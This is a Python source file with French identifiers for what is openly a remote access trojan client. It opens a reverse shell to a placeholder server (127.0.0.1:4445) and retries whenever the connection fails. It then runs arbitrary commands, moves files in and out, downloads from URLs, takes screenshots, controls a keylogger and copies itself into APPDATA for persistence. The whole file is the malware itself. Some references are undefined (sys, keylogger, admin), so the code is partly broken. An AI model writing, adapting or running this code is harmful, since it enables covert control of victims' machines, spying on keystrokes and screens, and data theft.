import socket
import json
import subprocess
import time
import os
import threading
import shutil
from sys import platform
from mss import mss
import requests



def envoyer_fichier(nom_fichier):
    f = open(nom_fichier, 'rb')
    s.send(f.read())


def telecharger_url(url):
    reponse = requests.get(url)
    nom_fichier = url.split('/')[-1]
    with open(nom_fichier, 'wb') as fichier_sortie:
        fichier_sortie.write(reponse.content)

def envoi_fiable(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def telecharger_fichier(nom_fichier):
    f = open(nom_fichier, 'wb')
    s.settimeout(2)
    morceau = s.recv(1024)
    while morceau:
        f.write(morceau)
        try:
            morceau = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def reception_fiable():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def capture_ecran():
    if platform == "linux" or platform == "linux2":
        with mss(display=":0.0") as ecran:
            nom_fichier = ecran.shot()
            os.rename(nom_fichier, '.capture_ecran.png')


def persistance(nom_registre, nom_copie):
    emplacement_fichier = os.environ['appdata'] + '\\' + nom_copie
    try:
        if not os.path.exists(emplacement_fichier):
            shutil.copyfile(sys.executable, emplacement_fichier)
            envoi_fiable('[+] Persistance créée avec la clé Reg.: ' + nom_registre)
        else:
            envoi_fiable('[+] La persistance existe déjà..')
    except:
        envoi_fiable('[-] Erreur lors de la création de la persistance avec la machine cible.')

def shell():
    while True:
        commande = reception_fiable()
        if commande == 'quit':
            break
        elif commande == 'background':
            pass
        elif commande == 'help':
            pass
        elif commande == 'clear':
            pass  # END
        elif commande[:3] == 'cd ':
            os.chdir(commande[3:])
        elif commande[:6] == 'upload':
            telecharger_fichier(commande[7:])
        elif commande[:8] == 'download':
            envoyer_fichier(commande[9:])
        elif commande[:3] == 'get':
            try:
                telecharger_url(commande[4:])
                envoi_fiable('[+] Télécharger les fichiers à partir de l\'URL !')
            except:
                envoi_fiable('[!!] Le téléchargement a échoué')
        elif commande[:10] == 'capture_ecran':
            capture_ecran()
            envoyer_fichier('.capture_ecran.png')
            os.remove('.capture_ecran.png')
        elif commande[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            envoi_fiable('[+] Keylogger Démarré !')
        elif commande[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            envoi_fiable(logs)
        elif commande[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            envoi_fiable('[+] Keylogger Arrêté !')
        elif commande[:11] == 'persistance':
            nom_registre, nom_copie = commande[12:].split(' ')
            persistance(nom_registre, nom_copie)
        elif commande[:7] == 'sendall':
            subprocess.Popen(commande[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
        elif commande[:5] == 'check':
            try:
                envoi_fiable(admin + ' plateforme: ' + platform)
            except:
                envoi_fiable('Impossible d\'effectuer une vérification des privilèges ! Plateforme : ' + platform)
        elif commande[:5] == 'start':
            try:
                subprocess.Popen(commande[6:], shell=True)
                envoi_fiable('[+] Démarré !')
            except:
                envoi_fiable('[-] Impossible de le lancer !')
        else:
            execute = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            resultat = execute.stdout.read() + execute.stderr.read()
            resultat = resultat.decode()
            envoi_fiable(resultat)

def connexion():
    while True:
        time.sleep(5)
        try:
            s.connect(('127.0.0.1', 4445))  # IP DU SERVEUR + PORT
            shell()
            s.close()
            break
        except:
            connexion()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion()